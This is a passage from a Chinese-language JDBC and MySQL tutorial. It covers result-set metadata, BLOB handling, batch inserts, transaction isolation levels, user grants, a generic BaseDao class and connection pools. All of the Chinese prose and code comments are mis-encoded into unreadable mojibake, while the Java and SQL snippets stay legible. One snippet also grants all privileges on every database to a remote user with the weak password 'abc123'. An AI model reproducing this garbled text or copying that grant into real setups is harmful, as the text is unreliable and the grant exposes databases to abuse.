column)ï¼šæŒ‡ç¤ºæ˜¯å¦è‡ªåŠ¨ä¸ºæŒ‡å®šåˆ—è¿›è¡Œç¼–å·ï¼Œè¿™æ ·è¿™äº›åˆ—ä»ç„¶æ˜¯åªè¯»çš„ã€‚\né—®é¢˜1ï¼šå¾—åˆ°ç»“æœé›†å, å¦‚ä½•çŸ¥é“è¯¥ç»“æœé›†ä¸­æœ‰å“ªäº›åˆ— ï¼Ÿ åˆ—åæ˜¯ä»€ä¹ˆï¼Ÿ\nâ€‹ éœ€è¦ä½¿ç”¨ä¸€ä¸ªæè¿° ResultSet çš„å¯¹è±¡ï¼Œ å³ ResultSetMetaData\né—®é¢˜2ï¼šå…³äºResultSetMetaData\nå¦‚ä½•è·å– ResultSetMetaDataï¼š è°ƒç”¨ ResultSet çš„ getMetaData() æ–¹æ³•å³å¯ è·å– ResultSet ä¸­æœ‰å¤šå°‘åˆ—ï¼šè°ƒç”¨ ResultSetMetaData çš„ getColumnCount() æ–¹æ³• è·å– ResultSet æ¯ä¸€åˆ—çš„åˆ—çš„åˆ«åæ˜¯ä»€ä¹ˆï¼šè°ƒç”¨ ResultSetMetaData çš„getColumnLabel() æ–¹æ³• 3.4 èµ„æºçš„é‡Šæ”¾ æ•°æ®åº“ç»“æŸåä¸€å®šè¦å…³é—­æ‰€æœ‰çš„è¿æ¥ 3.6 JDBC APIå°ç»“ ä¸¤ç§æ€æƒ³\né¢å‘æ¥å£ç¼–ç¨‹çš„æ€æƒ³ ORMæ€æƒ³(object relational mapping) ä¸€ä¸ªæ•°æ®è¡¨å¯¹åº”ä¸€ä¸ªjavaç±» è¡¨ä¸­çš„ä¸€æ¡è®°å½•å¯¹åº”javaç±»çš„ä¸€ä¸ªå¯¹è±¡ è¡¨ä¸­çš„ä¸€ä¸ªå­—æ®µå¯¹åº”javaç±»çš„ä¸€ä¸ªå±æ€§ sqlæ˜¯éœ€è¦ç»“åˆåˆ—åå’Œè¡¨çš„å±æ€§åæ¥å†™ã€‚æ³¨æ„èµ·åˆ«åã€‚\nä¸¤ç§æŠ€æœ¯\nJDBCç»“æœé›†çš„å…ƒæ•°æ®ï¼šResultSetMetaData è·å–åˆ—æ•°ï¼šgetColumnCount() è·å–åˆ—çš„åˆ«åï¼šgetColumnLabel() é€šè¿‡åå°„ï¼Œåˆ›å»ºæŒ‡å®šç±»çš„å¯¹è±¡ï¼Œè·å–æŒ‡å®šçš„å±æ€§å¹¶èµ‹å€¼ å››ï¼š æ“ä½œBLOBç±»å‹å­—æ®µ 4.1 MySQL BLOBç±»å‹ MySQLä¸­ï¼ŒBLOBæ˜¯ä¸€ä¸ªäºŒè¿›åˆ¶å¤§å‹å¯¹è±¡ï¼Œæ˜¯ä¸€ä¸ªå¯ä»¥å­˜å‚¨å¤§é‡æ•°æ®çš„å®¹å™¨ï¼Œå®ƒèƒ½å®¹çº³ä¸åŒå¤§å°çš„æ•°æ®ã€‚\næ’å…¥BLOBç±»å‹çš„æ•°æ®å¿…é¡»ä½¿ç”¨PreparedStatementï¼Œå› ä¸ºBLOBç±»å‹çš„æ•°æ®æ— æ³•ä½¿ç”¨å­—ç¬¦ä¸²æ‹¼æ¥å†™çš„ã€‚\nMySQLçš„å››ç§BLOBç±»å‹(é™¤äº†åœ¨å­˜å‚¨çš„æœ€å¤§ä¿¡æ¯é‡ä¸Šä¸åŒå¤–ï¼Œä»–ä»¬æ˜¯ç­‰åŒçš„)\nå¦‚æœåœ¨æŒ‡å®šäº†ç›¸å…³çš„Blobç±»å‹ä»¥åï¼Œè¿˜æŠ¥é”™ï¼šxxx too largeï¼Œé‚£ä¹ˆåœ¨mysqlçš„å®‰è£…ç›®å½•ä¸‹ï¼Œæ‰¾my.iniæ–‡ä»¶åŠ ä¸Šå¦‚ä¸‹çš„é…ç½®å‚æ•°ï¼š max_allowed_packet=16Mã€‚åŒæ—¶æ³¨æ„ï¼šä¿®æ”¹äº†my.iniæ–‡ä»¶ä¹‹åï¼Œéœ€è¦é‡æ–°å¯åŠ¨mysqlæœåŠ¡ã€‚ 4.2 å‘æ•°æ®è¡¨ä¸­æ’å…¥å¤§æ•°æ®ç±»å‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 //è·å–è¿æ¥ Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into customers(name,email,birth,photo)values(?,?,?,?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); // å¡«å……å ä½ç¬¦ ps.setString(1, \u0026#34;å¾æµ·å¼º\u0026#34;); ps.setString(2, \u0026#34;xhq@126.com\u0026#34;); ps.setDate(3, new Date(new java.util.Date().getTime())); // æ“ä½œBlobç±»å‹çš„å˜é‡ FileInputStream fis = new FileInputStream(\u0026#34;xhq.png\u0026#34;); ps.setBlob(4, fis); //æ‰§è¡Œ ps.execute(); fis.close(); JDBCUtils.closeResource(conn, ps); 4.3 ä¿®æ”¹æ•°æ®è¡¨ä¸­çš„Blobç±»å‹å­—æ®µ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;update customers set photo = ? where id = ?\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); // å¡«å……å ä½ç¬¦ // æ“ä½œBlobç±»å‹çš„å˜é‡ FileInputStream fis = new FileInputStream(\u0026#34;coffee.png\u0026#34;); ps.setBlob(1, fis); ps.setInt(2, 25); ps.execute(); fis.close(); JDBCUtils.closeResource(conn, ps); 4.4 ä»æ•°æ®è¡¨ä¸­è¯»å–å¤§æ•°æ®ç±»å‹ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 String sql = \u0026#34;SELECT id, name, email, birth, photo FROM customer WHERE id = ?\u0026#34;; conn = getConnection(); ps = conn.prepareStatement(sql); ps.setInt(1, 8); rs = ps.executeQuery(); if(rs.next()){ Integer id = rs.getInt(1); String name = rs.getString(2); String email = rs.getString(3); Date birth = rs.getDate(4); Customer cust = new Customer(id, name, email, birth); System.out.println(cust); //è¯»å–Blobç±»å‹çš„å­—æ®µ Blob photo = rs.getBlob(5); InputStream is = photo.getBinaryStream(); OutputStream os = new FileOutputStream(\u0026#34;c.jpg\u0026#34;); byte [] buffer = new byte[1024]; int len = 0; while((len = is.read(buffer)) != -1){ os.write(buffer, 0, len); } JDBCUtils.closeResource(conn, ps, rs); if(is != null){ is.close(); } if(os != null){ os.close(); } } äº”ï¼š æ‰¹é‡æ’å…¥ 5.1 æ‰¹é‡æ‰§è¡ŒSQLè¯­å¥ å½“éœ€è¦æˆæ‰¹æ’å…¥æˆ–è€…æ›´æ–°è®°å½•æ—¶ï¼Œå¯ä»¥é‡‡ç”¨Javaçš„æ‰¹é‡æ›´æ–°æœºåˆ¶ï¼Œè¿™ä¸€æœºåˆ¶å…è®¸å¤šæ¡è¯­å¥ä¸€æ¬¡æ€§æäº¤ç»™æ•°æ®åº“æ‰¹é‡å¤„ç†ã€‚é€šå¸¸æƒ…å†µä¸‹æ¯”å•ç‹¬æäº¤å¤„ç†æ›´æœ‰æ•ˆç‡\nJDBCçš„æ‰¹é‡å¤„ç†è¯­å¥åŒ…æ‹¬ä¸‹é¢ä¸‰ä¸ªæ–¹æ³•ï¼š\naddBatch(String)ï¼šæ·»åŠ éœ€è¦æ‰¹é‡å¤„ç†çš„SQLè¯­å¥æˆ–æ˜¯å‚æ•°ï¼› executeBatch()ï¼šæ‰§è¡Œæ‰¹é‡å¤„ç†è¯­å¥ï¼› clearBatch():æ¸…ç©ºç¼“å­˜çš„æ•°æ® é€šå¸¸æˆ‘ä»¬ä¼šé‡åˆ°ä¸¤ç§æ‰¹é‡æ‰§è¡ŒSQLè¯­å¥çš„æƒ…å†µï¼š\nå¤šæ¡SQLè¯­å¥çš„æ‰¹é‡å¤„ç†ï¼› ä¸€ä¸ªSQLè¯­å¥çš„æ‰¹é‡ä¼ å‚ï¼› 5.2 é«˜æ•ˆçš„æ‰¹é‡æ’å…¥ ä¸¾ä¾‹ï¼šå‘æ•°æ®è¡¨ä¸­æ’å…¥20000æ¡æ•°æ® 5.2.1 å®ç°å±‚æ¬¡ä¸€ï¼šä½¿ç”¨Statement 1 2 3 4 5 6 Connection conn = JDBCUtils.getConnection(); Statement st = conn.createStatement(); for(int i = 1;i \u0026lt;= 20000;i++){ String sql = \u0026#34;insert into goods(name) values(\u0026#39;name_\u0026#39; + \u0026#34;+ i +\u0026#34;)\u0026#34;; st.executeUpdate(sql); } 5.2.2 å®ç°å±‚æ¬¡äºŒï¼šä½¿ç”¨PreparedStatement 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 20000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); ps.executeUpdate(); } long end = System.currentTimeMillis(); System.out.println(\u0026#34;èŠ±è´¹çš„æ—¶é—´ä¸ºï¼š\u0026#34; + (end - start));//82340 JDBCUtils.closeResource(conn, ps); æ³•äºŒæ¯”æ³•ä¸€å¿«çš„åŸå› æ˜¯ï¼šPrepareStatementå¯ä»¥ç»™sqlæå‰é¢„å¤‡å¥½ï¼Œå®é™…ä¸Šï¼Œsqlåªéœ€è¦æ‹¼æ¥ä¸€æ¬¡ï¼Œè€Œstatementéœ€è¦æ‹¼æ¥å¤šæ¬¡ã€‚ 5.2.3 å®ç°å±‚æ¬¡ä¸‰ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 /* * ä¿®æ”¹1ï¼š ä½¿ç”¨ addBatch() / executeBatch() / clearBatch() * ä¿®æ”¹2ï¼šmysqlæœåŠ¡å™¨é»˜è®¤æ˜¯å…³é—­æ‰¹å¤„ç†çš„ï¼Œæˆ‘ä»¬éœ€è¦é€šè¿‡ä¸€ä¸ªå‚æ•°ï¼Œè®©mysqlå¼€å¯æ‰¹å¤„ç†çš„æ”¯æŒã€‚ * ?rewriteBatchedStatements=true å†™åœ¨é…ç½®æ–‡ä»¶çš„urlåé¢ * ä¿®æ”¹3ï¼šä½¿ç”¨æ›´æ–°çš„mysql é©±åŠ¨ï¼šmysql-connector-java-5.1.37-bin.jar * */ @Test public void testInsert1() throws Exception{ long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 1000000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.â€œæ”’â€sql ps.addBatch(); if(i % 500 == 0){ //2.æ‰§è¡Œ ps.executeBatch(); //3.æ¸…ç©º ps.clearBatch(); } } long end = System.currentTimeMillis(); System.out.println(\u0026#34;èŠ±è´¹çš„æ—¶é—´ä¸ºï¼š\u0026#34; + (end - start));//20000æ¡ï¼š625 //1000000æ¡:14733 JDBCUtils.closeResource(conn, ps); } æ³•ä¸‰æ˜¯åˆ©ç”¨Batch,ç›¸å½“äºä¸€ä¸ªæ± å­ï¼Œå½“ç§¯ç´¯çš„è¯·æ±‚è¾¾åˆ°ä¸€å®šç¨‹åº¦çš„æ—¶å€™ï¼Œé›†ä¸­è¿›è¡Œæ‰§è¡Œã€‚ 5.2.4 å®ç°å±‚æ¬¡å›› 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 /* * å±‚æ¬¡å››ï¼šåœ¨å±‚æ¬¡ä¸‰çš„åŸºç¡€ä¸Šæ“ä½œ * ä½¿ç”¨Connection çš„ setAutoCommit(false) / commit() */ @Test public void testInsert2() throws Exception{ long start = System.currentTimeMillis(); Connection conn = JDBCUtils.getConnection(); //1.è®¾ç½®ä¸ºä¸è‡ªåŠ¨æäº¤æ•°æ® conn.setAutoCommit(false); String sql = \u0026#34;insert into goods(name)values(?)\u0026#34;; PreparedStatement ps = conn.prepareStatement(sql); for(int i = 1;i \u0026lt;= 1000000;i++){ ps.setString(1, \u0026#34;name_\u0026#34; + i); //1.â€œæ”’â€sql ps.addBatch(); if(i % 500 == 0){ //2.æ‰§è¡Œ ps.executeBatch(); //3.æ¸…ç©º ps.clearBatch(); } } //2.æäº¤æ•°æ® conn.commit(); long end = System.currentTimeMillis(); System.out.println(\u0026#34;èŠ±è´¹çš„æ—¶é—´ä¸ºï¼š\u0026#34; + (end - start));//1000000æ¡:4978 JDBCUtils.closeResource(conn, ps); } æ³•å›› ç›¸æ¯”è¾ƒæ³•ä¸‰ï¼Œ åªéœ€è¦æäº¤ä¸€æ¬¡ã€‚io è¯·æ±‚å‡å°‘ã€‚ å…­ï¼š æ•°æ®åº“äº‹åŠ¡ 6.1 æ•°æ®åº“äº‹åŠ¡ä»‹ç» äº‹åŠ¡ï¼šä¸€ç»„é€»è¾‘æ“ä½œå•å…ƒ,ä½¿æ•°æ®ä»ä¸€ç§çŠ¶æ€å˜æ¢åˆ°å¦ä¸€ç§çŠ¶æ€ã€‚\näº‹åŠ¡å¤„ç†ï¼ˆäº‹åŠ¡æ“ä½œï¼‰ï¼šä¿è¯æ‰€æœ‰äº‹åŠ¡éƒ½ä½œä¸ºä¸€ä¸ªå·¥ä½œå•å…ƒæ¥æ‰§è¡Œï¼Œå³ä½¿å‡ºç°äº†æ•…éšœï¼Œéƒ½ä¸èƒ½æ”¹å˜è¿™ç§æ‰§è¡Œæ–¹å¼ã€‚å½“åœ¨ä¸€ä¸ªäº‹åŠ¡ä¸­æ‰§è¡Œå¤šä¸ªæ“ä½œæ—¶ï¼Œè¦ä¹ˆæ‰€æœ‰çš„äº‹åŠ¡éƒ½è¢«æäº¤(commit)ï¼Œé‚£ä¹ˆè¿™äº›ä¿®æ”¹å°±æ°¸ä¹…åœ°ä¿å­˜ä¸‹æ¥ï¼›è¦ä¹ˆæ•°æ®åº“ç®¡ç†ç³»ç»Ÿå°†æ”¾å¼ƒæ‰€ä½œçš„æ‰€æœ‰ä¿®æ”¹ï¼Œæ•´ä¸ªäº‹åŠ¡**å›æ»š(rollback)**åˆ°æœ€åˆçŠ¶æ€ã€‚\nä¸ºç¡®ä¿æ•°æ®åº“ä¸­æ•°æ®çš„ä¸€è‡´æ€§ï¼Œæ•°æ®çš„æ“çºµåº”å½“æ˜¯ç¦»æ•£çš„æˆç»„çš„é€»è¾‘å•å…ƒï¼šå½“å®ƒå…¨éƒ¨å®Œæˆæ—¶ï¼Œæ•°æ®çš„ä¸€è‡´æ€§å¯ä»¥ä¿æŒï¼Œè€Œå½“è¿™ä¸ªå•å…ƒä¸­çš„ä¸€éƒ¨åˆ†æ“ä½œå¤±è´¥ï¼Œæ•´ä¸ªäº‹åŠ¡åº”å…¨éƒ¨è§†ä¸ºé”™è¯¯ï¼Œæ‰€æœ‰ä»èµ·å§‹ç‚¹ä»¥åçš„æ“ä½œåº”å…¨éƒ¨å›é€€åˆ°å¼€å§‹çŠ¶æ€ã€‚\n6.2 äº‹åŠ¡çš„ACIDå±æ€§ åŸå­æ€§ï¼ˆAtomicityï¼‰ åŸå­æ€§æ˜¯æŒ‡äº‹åŠ¡æ˜¯ä¸€ä¸ªä¸å¯åˆ†å‰²çš„å·¥ä½œå•ä½ï¼Œäº‹åŠ¡ä¸­çš„æ“ä½œè¦ä¹ˆéƒ½å‘ç”Ÿï¼Œè¦ä¹ˆéƒ½ä¸å‘ç”Ÿã€‚\nä¸€è‡´æ€§ï¼ˆConsistencyï¼‰ äº‹åŠ¡å¿…é¡»ä½¿æ•°æ®åº“ä»ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€å˜æ¢åˆ°å¦å¤–ä¸€ä¸ªä¸€è‡´æ€§çŠ¶æ€ã€‚\néš”ç¦»æ€§ï¼ˆIsolationï¼‰ äº‹åŠ¡çš„éš”ç¦»æ€§æ˜¯æŒ‡ä¸€ä¸ªäº‹åŠ¡çš„æ‰§è¡Œä¸èƒ½è¢«å…¶ä»–äº‹åŠ¡å¹²æ‰°ï¼Œå³ä¸€ä¸ªäº‹åŠ¡å†…éƒ¨çš„æ“ä½œåŠä½¿ç”¨çš„æ•°æ®å¯¹å¹¶å‘çš„å…¶ä»–äº‹åŠ¡æ˜¯éš”ç¦»çš„ï¼Œå¹¶å‘æ‰§è¡Œçš„å„ä¸ªäº‹åŠ¡ä¹‹é—´ä¸èƒ½äº’ç›¸å¹²æ‰°ã€‚\næŒä¹…æ€§ï¼ˆDurabilityï¼‰ æŒä¹…æ€§æ˜¯æŒ‡ä¸€ä¸ªäº‹åŠ¡ä¸€æ—¦è¢«æäº¤ï¼Œå®ƒå¯¹æ•°æ®åº“ä¸­æ•°æ®çš„æ”¹å˜å°±æ˜¯æ°¸ä¹…æ€§çš„ï¼Œæ¥ä¸‹æ¥çš„å…¶ä»–æ“ä½œå’Œæ•°æ®åº“æ•…éšœä¸åº”è¯¥å¯¹å…¶æœ‰ä»»ä½•å½±å“ã€‚\n6.3.1 æ•°æ®åº“çš„å¹¶å‘é—®é¢˜ å¯¹äºåŒæ—¶è¿è¡Œçš„å¤šä¸ªäº‹åŠ¡, å½“è¿™äº›äº‹åŠ¡è®¿é—®æ•°æ®åº“ä¸­ç›¸åŒçš„æ•°æ®æ—¶, å¦‚æœæ²¡æœ‰é‡‡å–å¿…è¦çš„éš”ç¦»æœºåˆ¶, å°±ä¼šå¯¼è‡´å„ç§å¹¶å‘é—®é¢˜:\nè„è¯»: å¯¹äºä¸¤ä¸ªäº‹åŠ¡ T1, T2, T1 è¯»å–äº†å·²ç»è¢« T2 æ›´æ–°ä½†è¿˜æ²¡æœ‰è¢«æäº¤çš„å­—æ®µã€‚ä¹‹å, è‹¥ T2 å›æ»š, T1è¯»å–çš„å†…å®¹å°±æ˜¯ä¸´æ—¶ä¸”æ— æ•ˆçš„ã€‚ ä¸å¯é‡å¤è¯»: å¯¹äºä¸¤ä¸ªäº‹åŠ¡T1, T2, T1 è¯»å–äº†ä¸€ä¸ªå­—æ®µ, ç„¶å T2 æ›´æ–°äº†è¯¥å­—æ®µã€‚ä¹‹å, T1å†æ¬¡è¯»å–åŒä¸€ä¸ªå­—æ®µ, å€¼å°±ä¸åŒäº†ã€‚ å¹»è¯»: å¯¹äºä¸¤ä¸ªäº‹åŠ¡T1, T2, T1 ä»ä¸€ä¸ªè¡¨ä¸­è¯»å–äº†ä¸€ä¸ªå­—æ®µ, ç„¶å T2 åœ¨è¯¥è¡¨ä¸­æ’å…¥äº†ä¸€äº›æ–°çš„è¡Œã€‚ä¹‹å, å¦‚æœ T1 å†æ¬¡è¯»å–åŒä¸€ä¸ªè¡¨, å°±ä¼šå¤šå‡ºå‡ è¡Œã€‚ æ•°æ®åº“äº‹åŠ¡çš„éš”ç¦»æ€§: æ•°æ®åº“ç³»ç»Ÿå¿…é¡»å…·æœ‰éš”ç¦»å¹¶å‘è¿è¡Œå„ä¸ªäº‹åŠ¡çš„èƒ½åŠ›, ä½¿å®ƒä»¬ä¸ä¼šç›¸äº’å½±å“, é¿å…å„ç§å¹¶å‘é—®é¢˜ã€‚\nä¸€ä¸ªäº‹åŠ¡ä¸å…¶ä»–äº‹åŠ¡éš”ç¦»çš„ç¨‹åº¦ç§°ä¸ºéš”ç¦»çº§åˆ«ã€‚æ•°æ®åº“è§„å®šäº†å¤šç§äº‹åŠ¡éš”ç¦»çº§åˆ«, ä¸åŒéš”ç¦»çº§åˆ«å¯¹åº”ä¸åŒçš„å¹²æ‰°ç¨‹åº¦, éš”ç¦»çº§åˆ«è¶Šé«˜, æ•°æ®ä¸€è‡´æ€§å°±è¶Šå¥½, ä½†å¹¶å‘æ€§è¶Šå¼±ã€‚\n6.3.2 å››ç§éš”ç¦»çº§åˆ« æ•°æ®åº“æä¾›çš„4ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼š\nOracle æ”¯æŒçš„ 2 ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ï¼šREAD COMMITED, SERIALIZABLEã€‚ Oracle é»˜è®¤çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ä¸º: READ COMMITED ã€‚\nMysql æ”¯æŒ 4 ç§äº‹åŠ¡éš”ç¦»çº§åˆ«ã€‚Mysql é»˜è®¤çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ä¸º: REPEATABLE READã€‚\n6.3.3 åœ¨MySqlä¸­è®¾ç½®éš”ç¦»çº§åˆ« æ¯å¯åŠ¨ä¸€ä¸ª mysql ç¨‹åº, å°±ä¼šè·å¾—ä¸€ä¸ªå•ç‹¬çš„æ•°æ®åº“è¿æ¥. æ¯ä¸ªæ•°æ®åº“è¿æ¥éƒ½æœ‰ä¸€ä¸ªå…¨å±€å˜é‡ @@tx_isolation, è¡¨ç¤ºå½“å‰çš„äº‹åŠ¡éš”ç¦»çº§åˆ«ã€‚\næŸ¥çœ‹å½“å‰çš„éš”ç¦»çº§åˆ«:\n1 SELECT @@tx_isolation; è®¾ç½®å½“å‰ mySQL è¿æ¥çš„éš”ç¦»çº§åˆ«:\n1 set transaction isolation level read committed; è®¾ç½®æ•°æ®åº“ç³»ç»Ÿçš„å…¨å±€çš„éš”ç¦»çº§åˆ«:\n1 set global transaction isolation level read committed; è¡¥å……æ“ä½œï¼š\nåˆ›å»ºmysqlæ•°æ®åº“ç”¨æˆ·ï¼š\n1 create user tom identified by \u0026#39;abc123\u0026#39;; æˆäºˆæƒé™\n1 2 3 4 5 #æˆäºˆé€šè¿‡ç½‘ç»œæ–¹å¼ç™»å½•çš„tomç”¨æˆ·ï¼Œå¯¹æ‰€æœ‰åº“æ‰€æœ‰è¡¨çš„å…¨éƒ¨æƒé™ï¼Œå¯†ç è®¾ä¸ºabc123. grant all privileges on *.* to tom@\u0026#39;%\u0026#39; identified by \u0026#39;abc123\u0026#39;; #ç»™tomç”¨æˆ·ä½¿ç”¨æœ¬åœ°å‘½ä»¤è¡Œæ–¹å¼ï¼Œæˆäºˆatguigudbè¿™ä¸ªåº“ä¸‹çš„æ‰€æœ‰è¡¨çš„æ’åˆ æ”¹æŸ¥çš„æƒé™ã€‚ grant select,insert,delete,update on atguigudb.* to tom@localhost identified by \u0026#39;abc123\u0026#39;; ä¸ƒï¼šDAOåŠç›¸å…³å®ç°ç±» DAOï¼šData Access Objectè®¿é—®æ•°æ®ä¿¡æ¯çš„ç±»å’Œæ¥å£ï¼ŒåŒ…æ‹¬äº†å¯¹æ•°æ®çš„CRUDï¼ˆCreateã€Retrivalã€Updateã€Deleteï¼‰ï¼Œè€Œä¸åŒ…å«ä»»ä½•ä¸šåŠ¡ç›¸å…³çš„ä¿¡æ¯ã€‚æœ‰æ—¶ä¹Ÿç§°ä½œï¼šBaseDAO ä½œç”¨ï¼šä¸ºäº†å®ç°åŠŸèƒ½çš„æ¨¡å—åŒ–ï¼Œæ›´æœ‰åˆ©äºä»£ç çš„ç»´æŠ¤å’Œå‡çº§ã€‚ ã€BaseDAO.javaã€‘ 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 101 102 103 104 105 106 107 108 109 110 package com.atguigu.bookstore.dao; import java.lang.reflect.ParameterizedType; import java.lang.reflect.Type; import java.sql.Connection; import java.sql.SQLException; import java.util.List; import org.apache.commons.dbutils.QueryRunner; import org.apache.commons.dbutils.handlers.BeanHandler; import org.apache.commons.dbutils.handlers.BeanListHandler; import org.apache.commons.dbutils.handlers.ScalarHandler; /** * å®šä¹‰ä¸€ä¸ªç”¨æ¥è¢«ç»§æ‰¿çš„å¯¹æ•°æ®åº“è¿›è¡ŒåŸºæœ¬æ“ä½œçš„Dao * * @author HanYanBing * * @param \u0026lt;T\u0026gt; */ public abstract class BaseDao\u0026lt;T\u0026gt; { private QueryRunner queryRunner = new QueryRunner(); // å®šä¹‰ä¸€ä¸ªå˜é‡æ¥æ¥æ”¶æ³›å‹çš„ç±»å‹ private Class\u0026lt;T\u0026gt; type; // è·å–Tçš„Classå¯¹è±¡ï¼Œè·å–æ³›å‹çš„ç±»å‹ï¼Œæ³›å‹æ˜¯åœ¨è¢«å­ç±»ç»§æ‰¿æ—¶æ‰ç¡®å®š public BaseDao() { // è·å–å­ç±»çš„ç±»å‹ Class clazz = this.getClass(); // è·å–çˆ¶ç±»çš„ç±»å‹ // getGenericSuperclass()ç”¨æ¥è·å–å½“å‰ç±»çš„çˆ¶ç±»çš„ç±»å‹ // ParameterizedTypeè¡¨ç¤ºçš„æ˜¯å¸¦æ³›å‹çš„ç±»å‹ ParameterizedType parameterizedType = (ParameterizedType) clazz.getGenericSuperclass(); // è·å–å…·ä½“çš„æ³›å‹ç±»å‹ getActualTypeArgumentsè·å–å…·ä½“çš„æ³›å‹çš„ç±»å‹ // è¿™ä¸ªæ–¹æ³•ä¼šè¿”å›ä¸€ä¸ªTypeçš„æ•°ç»„ Type[] types = parameterizedType.getActualTypeArguments(); // è·å–å…·ä½“çš„æ³›å‹çš„ç±»å‹Â· this.type = (Class\u0026lt;T\u0026gt;) types[0]; } /** * é€šç”¨çš„å¢åˆ æ”¹æ“ä½œ * * @param sql * @param params * @return */ public int update(Connection conn,String sql, Object... params) { int count = 0; try { count = queryRunner.update(conn, sql, params); } catch (SQLException e) { e.printStackTrace(); } return count; } /** * è·å–ä¸€ä¸ªå¯¹è±¡ * * @param sql * @param params * @return */ public T getBean(Connection conn,String sql, Object... params) { T t = null; try { t = queryRunner.query(conn, sql, new BeanHandler\u0026lt;T\u0026gt;(type), params); } catch (SQLException e) { e.printStackTrace(); } return t; } /** * è·å–æ‰€æœ‰å¯¹è±¡ * * @param sql * @param params * @return */ public List\u0026lt;T\u0026gt; getBeanList(Connection conn,String sql, Object... params) { List\u0026lt;T\u0026gt; list = null; try { list = queryRunner.query(conn, sql, new BeanListHandler\u0026lt;T\u0026gt;(type), params); } catch (SQLException e) { e.printStackTrace(); } return list; } /** * è·å–ä¸€ä¸ªä½†ä¸€å€¼å¾—æ–¹æ³•ï¼Œä¸“é—¨ç”¨æ¥æ‰§è¡Œåƒ select count(*)...è¿™æ ·çš„sqlè¯­å¥ * * @param sql * @param params * @return */ public Object getValue(Connection conn,String sql, Object... params) { Object count = null; try { // è°ƒç”¨queryRunnerçš„queryæ–¹æ³•è·å–ä¸€ä¸ªå•ä¸€çš„å€¼ count = queryRunner.query(conn, sql, new ScalarHandler\u0026lt;\u0026gt;(), params); } catch (SQLException e) { e.printStackTrace(); } return count; } } ä¹‹åå¯ä»¥å»ºç«‹ç›¸å…³çš„è¡¨ã€æ¥å£ï¼Œè¿›è€Œå°†å¯¹åº”è¡¨çš„DMLæ–¹æ³•å®ç° è¿™é‡Œä»¥customerè¡¨ä¸ºä¾‹å­ å…«ï¼šæ•°æ®åº“è¿æ¥æ±  8.1 æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯ ä¸ºè§£å†³ä¼ ç»Ÿå¼€å‘ä¸­çš„æ•°æ®åº“è¿æ¥é—®é¢˜ï¼Œå¯ä»¥é‡‡ç”¨æ•°æ®åº“è¿æ¥æ± æŠ€æœ¯ã€‚\næ•°æ®åº“è¿æ¥æ± çš„åŸºæœ¬æ€æƒ³ï¼šå°±æ˜¯ä¸ºæ•°æ®åº“è¿æ¥å»ºç«‹ä¸€ä¸ªâ€œç¼“å†²æ± â€ã€‚é¢„å…ˆåœ¨ç¼“å†²æ± ä¸­æ”¾å…¥ä¸€å®šæ•°é‡çš„è¿æ¥ï¼Œå½“éœ€è¦å»ºç«‹æ•°æ®åº“è¿æ¥æ—¶ï¼Œåªéœ€ä»â€œç¼“å†²æ± â€ä¸­å–å‡ºä¸€ä¸ªï¼Œä½¿ç”¨å®Œæ¯•ä¹‹åå†æ”¾å›å»ã€‚\næ•°æ®åº“è¿æ¥æ± è´Ÿè´£åˆ†é…ã€ç®¡ç†å’Œé‡Šæ”¾æ•°æ®åº“è¿æ¥ï¼Œå®ƒå…è®¸åº”ç”¨ç¨‹åºé‡å¤ä½¿ç”¨ä¸€ä¸ªç°æœ‰çš„æ•°æ®åº“è¿æ¥ï¼Œè€Œä¸æ˜¯é‡æ–°å»ºç«‹ä¸€ä¸ªã€‚\næ•°æ®åº“è¿æ¥æ± åœ¨åˆå§‹åŒ–æ—¶å°†åˆ›å»ºä¸€å®šæ•°é‡çš„æ•°æ®åº“è¿æ¥æ”¾åˆ°è¿æ¥æ± ä¸­ï¼Œè¿™äº›æ•°æ®åº“è¿æ¥çš„æ•°é‡æ˜¯ç”±æœ€å°æ•°æ®åº“è¿æ¥æ•°æ¥è®¾å®šçš„ã€‚æ— è®ºè¿™äº›æ•°æ®åº“è¿æ¥æ˜¯å¦è¢«ä½¿ç”¨ï¼Œè¿æ¥æ± éƒ½å°†ä¸€ç›´ä¿è¯è‡³å°‘æ‹¥æœ‰è¿™ä¹ˆå¤šçš„è¿æ¥æ•°é‡ã€‚è¿æ¥æ± çš„æœ€å¤§æ•°æ®åº“è¿æ¥æ•°é‡é™å®šäº†è¿™ä¸ªè¿æ¥æ± èƒ½å æœ‰çš„æœ€å¤§è¿æ¥æ•°ï¼Œå½“åº”ç”¨ç¨‹åºå‘è¿æ¥æ± 